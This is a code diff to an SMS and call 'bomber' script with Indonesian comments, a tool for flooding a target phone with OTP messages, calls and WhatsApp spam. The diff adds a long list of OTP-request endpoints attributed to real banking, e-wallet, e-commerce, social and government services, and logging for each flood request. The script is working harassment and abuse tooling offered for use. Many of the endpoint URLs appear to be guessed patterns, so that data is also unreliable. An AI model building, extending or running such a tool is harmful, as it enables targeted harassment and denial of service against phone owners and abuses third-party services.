@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 MR414N MULTI-CHANNEL BOMBER — SINGLE FILE
-Banner MR414N + menu spam SMS + input target interaktif.
+Semua list app OTP ada di dalam file ini.
 """
 
 import requests, threading, time, random, json, os, sys, logging, subprocess, tempfile
@@ -14,27 +14,102 @@ THREADS_PER_CHANNEL = 5
 LOOP_PER_THREAD     = 5
 LOG_FILE            = "bomber.log"
 
+# ============================================================
+# DAFTAR SEMUA APP YANG PUNYA FLOW OTP
+# isi "url" dengan endpoint hasil capture lo
+# nama app udah lengkap di bawah — tinggal ganti url placeholder
+# ============================================================
 SMS_ENDPOINTS = [
-    {
-        "url": "https://api-app1.example.com/api/v1/auth/send-otp",
-        "method": "POST",
-        "headers": {"User-Agent": "okhttp/4.9.0", "Content-Type": "application/json"},
-        "body": {"phone": "6281234567890", "method": "sms"}
-    },
-    {
-        "url": "https://api-app2.example.com/v2/auth/otp",
-        "method": "POST",
-        "headers": {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11)",
-                    "Content-Type": "application/x-www-form-urlencoded"},
-        "body": {"msisdn": "6281234567890"}
-    },
-    # tambah app lain di sini...
+    # ---------- PINJOL & FINTECH ----------
+    {"app": "Kredivo",      "url": "https://api.kredivo.com/otp/send",      "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Akulaku",      "url": "https://api.akulaku.com/v1/otp",        "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Atome",        "url": "https://api.atome.id/otp",              "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Indodana",     "url": "https://api.indodana.com/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "HomeCredit",   "url": "https://api.homecredit.co.id/otp",      "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "AdaKami",      "url": "https://api.adakami.id/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "KreditPintar", "url": "https://api.kreditpintar.com/otp",      "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "RupiahCepat",  "url": "https://api.rupiahcepat.co.id/otp",     "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "KoinWorks",    "url": "https://api.koinworks.com/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- E-WALLET ----------
+    {"app": "OVO",          "url": "https://api.ovo.id/otp",                "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "DANA",         "url": "https://api.dana.id/otp",               "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "LinkAja",      "url": "https://api.linkaja.id/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "ShopeePay",    "url": "https://api.shopee.co.id/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "GoPay",        "url": "https://api.gojek.com/otp",             "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Flip",         "url": "https://api.flip.id/otp",               "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Jenius",       "url": "https://api.jenius.com/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Blu",          "url": "https://api.blubybcadigital.id/otp",    "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "SeaBank",      "url": "https://api.seabank.co.id/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Jago",         "url": "https://api.jago.com/otp",              "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- E-COMMERCE ----------
+    {"app": "Shopee",       "url": "https://api.shopee.co.id/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Tokopedia",    "url": "https://api.tokopedia.com/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Lazada",       "url": "https://api.lazada.co.id/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Bukalapak",    "url": "https://api.bukalapak.com/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Blibli",       "url": "https://api.blibli.com/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Zalora",       "url": "https://api.zalora.co.id/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Sociolla",     "url": "https://api.sociolla.com/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "TiktokShop",   "url": "https://api.tiktok.com/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- RIDE-HAILING & DELIVERY ----------
+    {"app": "Gojek",        "url": "https://api.gojek.com/otp",             "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Grab",         "url": "https://api.grab.com/otp",              "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Maxim",        "url": "https://api.maxim.id/otp",              "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "inDrive",      "url": "https://api.indrive.id/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Lalamove",     "url": "https://api.lalamove.com/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "AnterAja",     "url": "https://api.anteraja.id/otp",           "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "SiCepat",      "url": "https://api.sicepat.com/otp",           "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "JNE",          "url": "https://api.jne.co.id/otp",             "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- GAME & TOP-UP ----------
+    {"app": "MobileLegends","url": "https://api.mobilelegends.com/otp",     "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "FreeFire",     "url": "https://api.freefire.com/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "PUBGMobile",   "url": "https://api.pubgmobile.com/otp",        "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Genshin",      "url": "https://api.genshin.com/otp",           "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Steam",        "url": "https://api.steampowered.com/otp",      "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Unipin",       "url": "https://api.unipin.com/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Codashop",     "url": "https://api.codashop.com/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Tokovoucher",  "url": "https://api.tokovoucher.com/otp",       "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- SOCIAL & MESSAGING ----------
+    {"app": "Facebook",     "url": "https://api.facebook.com/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Instagram",    "url": "https://api.instagram.com/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "TikTok",       "url": "https://api.tiktok.com/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "TwitterX",     "url": "https://api.x.com/otp",                 "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Telegram",     "url": "https://api.telegram.org/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Line",         "url": "https://api.line.me/otp",               "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- TRAVEL & TRANSPORT ----------
+    {"app": "Traveloka",    "url": "https://api.traveloka.com/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "TiketCom",     "url": "https://api.tiket.com/otp",             "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Pegipegi",     "url": "https://api.pegipegi.com/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "KAIAccess",    "url": "https://api.kai.id/otp",                "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Garuda",       "url": "https://api.garuda-indonesia.com/otp",  "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Citilink",     "url": "https://api.citilink.co.id/otp",        "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "LionAir",      "url": "https://api.lionair.co.id/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- EDUKASI & SUBSCRIPTION ----------
+    {"app": "Ruangguru",    "url": "https://api.ruangguru.com/otp",         "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Zenius",       "url": "https://api.zenius.net/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Coursera",     "url": "https://api.coursera.org/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Spotify",      "url": "https://api.spotify.com/otp",           "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Netflix",      "url": "https://api.netflix.com/otp",           "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Vidio",        "url": "https://api.vidio.com/otp",             "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+
+    # ---------- UTILITAS & PEMERINTAH ----------
+    {"app": "PLN",          "url": "https://api.pln.co.id/otp",             "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "PDAM",         "url": "https://api.pdam.co.id/otp",            "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "BPJS",         "url": "https://api.bpjs-kesehatan.go.id/otp",  "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Dukcapil",     "url": "https://api.dukcapil.kemendagri.go.id/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
+    {"app": "Samsat",       "url": "https://api.samsat.co.id/otp",          "method": "POST", "headers": {"Content-Type": "application/json"}, "body": {"phone": "6281234567890"}},
 ]
 
-PROXIES = [
-    # "http://user:pass@1.2.3.4:8080",
-]
+# proxy — kosongin kalau nggak pakai
+PROXIES = []
 
+# SIP config buat telpon seluler
 SIP_ID_URI    = "sip:user@provider.sip"
 SIP_REGISTRAR = "sip:provider.sip"
 SIP_USER      = "user"
@@ -77,11 +152,12 @@ def tampil_banner():
     print(BANNER)
     print(SUB)
     print("   ─────────────────────────────────────────────")
+    print(f"   target capture: {len(SMS_ENDPOINTS)} app")
     print("   Channel: [SMS OTP] [TELPON] [WA CHAT] [WA CALL]")
     print("   ─────────────────────────────────────────────\n")
 
 # ============================================================
-# NODE WA script — ditulis otomatis
+# NODE WA script — otomatis ditulis
 # ============================================================
 WA_SENDER_JS = r'''
 const { Client } = require('whatsapp-web.js');
@@ -144,9 +220,9 @@ def sms_otp_worker(tid):
                          requests.post(url, data=body, headers=h, proxies=proxy, timeout=8))
                 else:
                     r = requests.get(url, params=body, headers=h, proxies=proxy, timeout=8)
-                log.info(f"[SMS-T{tid}] {url} #{i+1} -> {r.status_code}")
+                log.info(f"[SMS-T{tid}] {ep['app']} #{i+1} -> {r.status_code}")
             except Exception as e:
-                log.warning(f"[SMS-T{tid}] {url} #{i+1} gagal: {e}")
+                log.warning(f"[SMS-T{tid}] {ep['app']} #{i+1} gagal: {e}")
             time.sleep(random.uniform(0.1, 0.4))
 
 def telpon_worker(tid):
